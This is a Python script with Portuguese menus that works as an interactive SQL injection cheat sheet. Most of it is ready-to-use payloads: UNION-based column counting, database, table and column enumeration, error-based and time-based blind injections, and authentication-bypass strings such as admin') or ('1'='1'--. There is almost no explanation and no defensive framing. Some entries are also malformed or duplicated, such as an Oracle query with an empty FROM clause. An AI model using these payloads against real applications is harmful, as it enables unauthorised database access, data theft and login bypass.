# BIBLIOTESCAS
# =============================
from os import system
from time import sleep
# =============================
#
#
# Funçao do SQLI


def fun_sqli():
    while True:
        system('clear')
        print("""
    ╔═╗╔═╗ ╦    ╦╔╗╔ ╦╔═╗╔═╗╔╦╗╦╔═╗╔╗╔  
    ╚═╗║═╬╗║    ║║║║ ║║╣ ║   ║ ║║ ║║║║  
    ╚═╝╚═╝╚╩═╝  ╩╝╚╝╚╝╚═╝╚═╝ ╩ ╩╚═╝╝╚╝  \n
    - A injeção de SQL (SQLi) é uma falha de segurança do aplicativo que permite que invasores controlem o banco de dados de um aplicativo, permitindo que eles acessem ou excluam dados, alterem o comportamento orientado a dados de um aplicativo e façam outras coisas indesejáveis, enganando o aplicativo para enviar comandos SQL inesperados.\n

    [01] - Número De Coluna
    [02] - Enumeração Do Banco De Dado
    [03] - Enumeração Do Nome Da Tabela
    [04] - Enumeração Do Nome Da Coluna
    [05] - Concatenação De Valores De Coluna
    [06] - Condicional(Baseado Em Erro)
    [07] - Com Base No Tempo
    [08] - Cargas Úteis Baseadas Em Erros Genéricos
    [09] - Cargas Baseadas Em Autenticação
    [10] - Ordenar Por E Cargas Úteis Baseadas Em Union
    [11] - Menu
    [99] - Sair
        """)
        cmd = str(input('===> '))
        if cmd == '1':
            system('clear')
            print("""
    ╔╗╔╔╦╗╔═╗╦═╗╔═╗  ╔╦╗╔═╗  ╔═╗╔═╗╦  ╦ ╦╔╗╔╔═╗                                                                     
    ║║║║║║║╣ ╠╦╝║ ║   ║║║╣   ║  ║ ║║  ║ ║║║║╠═╣                                                                     
    ╝╚╝╩ ╩╚═╝╩╚═╚═╝  ═╩╝╚═╝  ╚═╝╚═╝╩═╝╚═╝╝╚╝╩ ╩  \n
    - MySQL/MSSQL/PGSQL

    'UNION SELECT NULL,NULL,NULL -- -

    - ORACLE

    'UNION SELECT NULL,NULL,NULL FROM DUAL -- -

    - MYSQL/MSSQL/PGSQL/ORACLE - (adicione +1 até obter uma exceção)

    ' UNION ORDER BY 1 -- -
    """)
            input("[*] - Pressione ENTER para voltar...")
            fun_sqli()
            break

        elif cmd == '2':
            system('clear')
            print("""
    ╔═╗╔╗╔╦ ╦╔╦╗╔═╗╦═╗╔═╗╔═╗  ╔╦╗╔═╗  ╔╗ ╔═╗╔╗╔╔═╗╔═╗  ╔╦╗╔═╗  ╔╦╗╔═╗╔╦╗╔═╗╔═╗                                      
    ║╣ ║║║║ ║║║║║╣ ╠╦╝╠═╣║ ║   ║║║ ║  ╠╩╗╠═╣║║║║  ║ ║   ║║║╣    ║║╠═╣ ║║║ ║╚═╗                                      
    ╚═╝╝╚╝╚═╝╩ ╩╚═╝╩╚═╩ ╩╚═╝  ═╩╝╚═╝  ╚═╝╩ ╩╝╚╝╚═╝╚═╝  ═╩╝╚═╝  ═╩╝╩ ╩═╩╝╚═╝╚═╝   \n 
    - MySQL/MSSQL

    ' UNION SELECT @@version -- -

    - Oracle

    ' UNION SELECT banner from v$version -- -

    - Oracle(2º método)

    ' UNION SELECT version from v$instance -- -

    - Postgres

    ' UNION SELECT version() -- -
    """)
            input("[*] - Pressione ENTER para voltar...")
            fun_sqli()
            break
        elif cmd == '3':
            system('clear')
            print("""
    ╔═╗╔╗╔╦ ╦╔╦╗╔═╗╦═╗╔═╗╔═╗  ╔╦╗╔═╗  ╔╗╔╔═╗╔╦╗╔═╗  ╔╦╗╔═╗  ╔╦╗╔═╗╔╗ ╔═╗╦  ╔═╗                                      
    ║╣ ║║║║ ║║║║║╣ ╠╦╝╠═╣║ ║   ║║║ ║  ║║║║ ║║║║║╣    ║║╠═╣   ║ ╠═╣╠╩╗║╣ ║  ╠═╣                                      
    ╚═╝╝╚╝╚═╝╩ ╩╚═╝╩╚═╩ ╩╚═╝  ═╩╝╚═╝  ╝╚╝╚═╝╩ ╩╚═╝  ═╩╝╩ ╩   ╩ ╩ ╩╚═╝╚═╝╩═╝╩ ╩   \n    
    - MySQL/MSSQL/Postgres

    ' UNION SELECT table_name,NULL from INFORMATION_SCHEMA.TABLES -- -

    - Oracle

    ' UNION SELECT table_name,NULL FROM all_tables  -- -

            """)
            input("[*] - Pressione ENTER para voltar...")
            fun_sqli()
            break
        elif cmd == '4':
            system('clear')
            print("""
    ╔═╗╔╗╔╦ ╦╔╦╗╔═╗╦═╗╔═╗╔═╗  ╔╦╗╔═╗  ╔╗╔╔═╗╔╦╗╔═╗  ╔╦╗╔═╗  ╔═╗╔═╗╦  ╦ ╦╔╗╔╔═╗                                      
    ║╣ ║║║║ ║║║║║╣ ╠╦╝╠═╣║ ║   ║║║ ║  ║║║║ ║║║║║╣    ║║╠═╣  ║  ║ ║║  ║ ║║║║╠═╣                                      
    ╚═╝╝╚╝╚═╝╩ ╩╚═╝╩╚═╩ ╩╚═╝  ═╩╝╚═╝  ╝╚╝╚═╝╩ ╩╚═╝  ═╩╝╩ ╩  ╚═╝╚═╝╩═╝╚═╝╝╚╝╩ ╩  \n                                     
    - MySQL/MSSQL/Postgres

    ' UNION SELECT column_name,NULL from INFORMATION_SCHEMA.COLUMNS where table_name="X" -- -
    - Oracle

    ' UNION SELECT column_name,NULL FROM  where table_name="X"  -- -

            """)
            input("[*] - Pressione ENTER para voltar...")
            fun_sqli()
            break
        elif cmd == '5':
            system('clear')
            print("""
    ╔═╗╔═╗╔╗╔╔═╗╔═╗╔╦╗╔═╗╔╗╔╔═╗╔═╗  ╔╦╗╔═╗  ╦  ╦╔═╗╦  ╔═╗╦═╗╔═╗╔═╗  ╔╦╗╔═╗  ╔═╗╔═╗╦  ╦ ╦╔╗╔╔═╗                      
    ║  ║ ║║║║║  ╠═╣ ║ ║╣ ║║║╠═╣║ ║   ║║║╣   ╚╗╔╝╠═╣║  ║ ║╠╦╝║╣ ╚═╗   ║║║╣   ║  ║ ║║  ║ ║║║║╠═╣                      
    ╚═╝╚═╝╝╚╝╚═╝╩ ╩ ╩ ╚═╝╝╚╝╩ ╩╚═╝  ═╩╝╚═╝   ╚╝ ╩ ╩╩═╝╚═╝╩╚═╚═╝╚═╝  ═╩╝╚═╝  ╚═╝╚═╝╩═╝╚═╝╝╚╝╩ ╩  \n                     
    - MySQL/Postgres

    ' UNION SELECT concat(col1,':',col2) from table_name limit 1 -- -

    - MySQL(2nd method)

    ' UNION SELECT col1 ':' col2 from table_name limit 1 -- -

    - Oracle / Postgres

    ' UNION SELECT select col1 ||':'||col2, null FROM  where table_name="X"  -- -

    - MSSQL

    ' UNION SELECT col1+':'+col2,NULL from table_name limit 1 -- -

            """)
            input("[*] - Pressione ENTER para voltar...")
            fun_sqli()
            break
        elif cmd == '6':
            system('clear')
            print("""
    ╔═╗╔═╗╔╗╔╔╦╗╦╔═╗╦╔═╗╔╗╔╔═╗╦    ╔╗ ╔═╗╔═╗╔═╗╔═╗╔╦╗╔═╗  ╔═╗╔╦╗  ╔═╗╦═╗╦═╗╔═╗                                      
    ║  ║ ║║║║ ║║║║  ║║ ║║║║╠═╣║    ╠╩╗╠═╣╚═╗║╣ ╠═╣ ║║║ ║  ║╣ ║║║  ║╣ ╠╦╝╠╦╝║ ║                                      
    ╚═╝╚═╝╝╚╝═╩╝╩╚═╝╩╚═╝╝╚╝╩ ╩╩═╝  ╚═╝╩ ╩╚═╝╚═╝╩ ╩═╩╝╚═╝  ╚═╝╩ ╩  ╚═╝╩╚═╩╚═╚═╝  \n                                     
    - MySQL

    ' UNION SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') -- -

    - Postgres

    ' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END -- -

    - Oracle

    ' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual -- -

    - MSSQL

    ' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END -- -

            """)
            input("[*] - Pressione ENTER para voltar...")
            fun_sqli()
            break
        elif cmd == '7':
            system('clear')
            print("""
    ╔═╗╔═╗╔╦╗  ╔╗ ╔═╗╔═╗╔═╗  ╔╗╔╔═╗  ╔╦╗╔═╗╔╦╗╔═╗╔═╗                                                                
    ║  ║ ║║║║  ╠╩╗╠═╣╚═╗║╣   ║║║║ ║   ║ ║╣ ║║║╠═╝║ ║                                                                
    ╚═╝╚═╝╩ ╩  ╚═╝╩ ╩╚═╝╚═╝  ╝╚╝╚═╝   ╩ ╚═╝╩ ╩╩  ╚═╝   \n                                                              
    > ,(select * from (select(sleep(10)))a)
    > ';WAITFOR DELAY '0:0:30'--
            """)
            input("[*] - Pressione ENTER para voltar...")
            fun_sqli()
            break
        elif cmd == '8':
            system('clear')
            print("""
    ╔═╗╔═╗╦ ╦╦  ╔═╗╔═╗╔╦╗╔═╗  ╔╗ ╔═╗╔═╗╔═╗╔═╗╔╦╗╔═╗╔═╗  ╔═╗╔╦╗  ╔═╗╦═╗╦═╗╔═╗╔═╗  ╔═╗╔═╗╔╗╔╦═╗╦╔═╗╔═╗╔═╗             
    ╠═╝╠═╣╚╦╝║  ║ ║╠═╣ ║║╚═╗  ╠╩╗╠═╣╚═╗║╣ ╠═╣ ║║╠═╣╚═╗  ║╣ ║║║  ║╣ ╠╦╝╠╦╝║ ║╚═╗  ║ ╦║╣ ║║║╠╦╝║║  ║ ║╚═╗             
    ╩  ╩ ╩ ╩ ╩═╝╚═╝╩ ╩═╩╝╚═╝  ╚═╝╩ ╩╚═╝╚═╝╩ ╩═╩╝╩ ╩╚═╝  ╚═╝╩ ╩  ╚═╝╩╚═╩╚═╚═╝╚═╝  ╚═╝╚═╝╝╚╝╩╚═╩╚═╝╚═╝╚═╝ \n             
    - MySQL


    ' UNION SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') -- -

    - Postgres

    ' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END -- -

    - Oracle

    ' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual -- -

    - MSSQL

    ' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END -- -

            """)
            input("[*] - Pressione ENTER para voltar...")
            fun_sqli()
            break
        elif cmd == '9':
            system('clear')
            print("""
    ╔═╗╔═╗╦ ╦╦  ╔═╗╔═╗╔╦╗╔═╗  ╔╗ ╔═╗╔═╗╔═╗╔═╗╔╦╗╔═╗╔═╗  ╔═╗╔╦╗  ╔═╗╦ ╦╔╦╗╔═╗╔╗╔╔╦╗╦╔═╗╔═╗╔═╗                        
    ╠═╝╠═╣╚╦╝║  ║ ║╠═╣ ║║╚═╗  ╠╩╗╠═╣╚═╗║╣ ╠═╣ ║║╠═╣╚═╗  ║╣ ║║║  ╠═╣║ ║ ║ ║╣ ║║║ ║ ║║  ╠═╣║ ║                        
    ╩  ╩ ╩ ╩ ╩═╝╚═╝╩ ╩═╩╝╚═╝  ╚═╝╩ ╩╚═╝╚═╝╩ ╩═╩╝╩ ╩╚═╝  ╚═╝╩ ╩  ╩ ╩╚═╝ ╩ ╚═╝╝╚╝ ╩ ╩╚═╝╩ ╩╚═╝  \n                       
    > or true--
    > ") or true--
    > ') or true--
    > admin') or ('1'='1'--
    > admin') or ('1'='1'#
    > admin') or ('1'='1'/

            """)
            input("[*] - Pressione ENTER para voltar...")
            fun_sqli()
            break
        elif cmd == '10':
            system('clear')
            print("""
    ╔═╗╔═╗╔╦╗╦╔╦╗╔═╗╔═╗  ╔═╗╔═╗╦═╗    ╔═╗╔═╗╦ ╦╦  ╔═╗╔═╗╔╦╗╔═╗  ╔═╗╔═╗╔╦╗  ╔╗ ╔═╗╔═╗╔═╗  ╔╗╔╔═╗  ╦ ╦╔╗╔╦╔═╗╔╗╔
    ╠═╝║╣  ║║║ ║║║ ║╚═╗  ╠═╝║ ║╠╦╝    ╠═╝╠═╣╚╦╝║  ║ ║╠═╣ ║║╚═╗  ║  ║ ║║║║  ╠╩╗╠═╣╚═╗║╣   ║║║╠═╣  ║ ║║║║║║ ║║║║
    ╩  ╚═╝═╩╝╩═╩╝╚═╝╚═╝  ╩  ╚═╝╩╚═    ╩  ╩ ╩ ╩ ╩═╝╚═╝╩ ╩═╩╝╚═╝  ╚═╝╚═╝╩ ╩  ╚═╝╩ ╩╚═╝╚═╝  ╝╚╝╩ ╩  ╚═╝╝╚╝╩╚═╝╝╚╝\n
    > 1' ORDER BY 1--+
    > 1' ORDER BY 2--+
    > 1' ORDER BY 3--+
    > 1' ORDER BY 1,2--+
    > 1' ORDER BY 1,2,3--+
    > 1' GROUP BY 1,2,--+
    > 1' GROUP BY 1,2,3--+
    > ' GROUP BY columnnames having 1=1 --
    > -1' UNION SELECT 1,2,3--+
    > ' UNION SELECT sum(columnname ) from tablename --
    > -1 UNION SELECT 1 INTO @,@
    > -1 UNION SELECT 1 INTO @,@,@
    > 1 AND (SELECT * FROM Users) = 1	
    > ' AND MID(VERSION(),1,1) = '5';
    > ' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
            """)
            input("[*] - Pressione ENTER para voltar...")
            fun_sqli()
            break
        elif cmd == '11':
            break

        elif cmd == '99':
            print("Até logo...")
            exit()
        else:
            print("Comando Inválido!!!")
            sleep(2)
